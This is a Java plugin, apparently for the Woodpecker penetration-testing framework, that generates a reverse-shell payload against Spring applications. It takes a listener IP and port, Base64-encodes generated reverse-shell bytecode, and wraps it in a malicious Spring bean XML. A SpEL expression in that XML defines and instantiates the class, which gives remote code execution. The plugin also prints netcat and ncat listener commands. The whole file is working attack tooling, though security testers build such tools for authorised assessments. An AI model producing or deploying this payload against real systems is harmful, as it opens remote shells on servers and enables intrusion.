package plugins.helper.spring;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import util.BytesCodeGenerator;

import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

public class SpringBeanXMLGeneratorHelper implements IHelper {
    private IPluginHelper helper = SpringBeanPlugin.pluginHelper;
    @Override
    public String getHelperTabCaption() {
        return "反弹shell";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        IArg ip = helper.createArg();
        ip.setName("ip");
        ip.setRequired(true);
        ip.setDefaultValue("127.0.0.1");
        ip.setDescription("监听IP");

        IArg port = helper.createArg();
        port.setName("port");
        port.setRequired(true);
        port.setDefaultValue("34567");
        port.setType(IArg.ARG_TYPE_INT);
        port.setDescription("监听端口");

        IArg ssl = helper.createArg();
        ssl.setName("ssl");
        ssl.setDescription("是否使用SSL");
        ssl.setDefaultValue("true");
        ssl.setRequired(true);
        ssl.setEnumValue(Arrays.asList("true","false"));

        IArg className = helper.createArg();
        className.setName("class-name");
        className.setDescription("字节码类名");
        className.setRequired(false);

        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();
        usageBinder.setArgsList(Arrays.asList(ip,port,ssl));
        return usageBinder;
    }

    @Override
    public void doHelp(Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String ip = (String) map.get("ip");
        int port = Integer.parseInt((String) map.get("port"));
        boolean ssl = Boolean.parseBoolean((String) map.get("ssl"));
        String className = (String) map.get("class-name");

        if (className == null || className == ""){
            className = RandomUtil.getRandomString(5);
        }


        String code = null;
        if (ssl){
            code = Base64.getEncoder().encodeToString(BytesCodeGenerator.generateReverseShellBytesCode(ip,port,className));
            iResultOutput.infoPrintln(String.format("ncat -lvnp %d --ssl", port));
        } else {
            code = "";
            iResultOutput.infoPrintln(String.format("nc -lvnp %d", port));
        }

        String xml = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "       xmlns:spring=\"http://camel.apache.org/schema/spring\"\n" +
                "       xmlns:context=\"http://www.springframework.org/schema/context\"\n" +
                "       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\">\n" +
                "    <context:property-placeholder ignore-resource-not-found=\"false\" ignore-unresolvable=\"false\"/>\n" +
                "    <bean id=\"code\" class=\"java.lang.String\">\n" +
                "        <constructor-arg value=\"%s\">\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "    <bean  class=\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(org.springframework.util.Base64Utils).decodeFromString(code.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}\">\n" +
                "    </bean>\n" +
                "</beans>", code,className);

        iResultOutput.rawPrintln(xml);




    }

}
